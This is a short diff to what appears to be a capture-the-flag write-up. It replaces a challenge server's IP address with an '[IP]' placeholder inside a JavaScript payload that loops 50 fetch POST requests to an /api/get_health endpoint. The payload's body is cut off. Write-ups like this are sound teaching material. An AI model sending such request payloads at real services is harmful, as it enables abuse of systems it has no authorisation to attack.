@@ -45,7 +45,7 @@ So the final payload to be sent as a POST reqeust to api:
 ```javascript
 let str = "";
 for (let i = 0; i < 50; i++) {
-  fetch("http://161.35.33.243:31976/api/get_health", {
+  fetch("[IP]/api/get_health", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
